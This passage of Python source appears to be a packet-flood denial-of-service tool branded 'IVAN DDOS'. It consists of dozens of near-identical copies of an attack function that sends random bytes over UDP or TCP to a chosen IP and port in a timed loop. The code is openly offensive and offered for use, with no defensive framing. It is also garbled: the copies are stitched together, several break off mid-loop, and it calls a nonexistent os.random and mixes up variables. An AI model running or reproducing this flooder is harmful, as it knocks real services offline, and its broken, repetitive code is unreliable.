    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Selesai')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Selesai')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
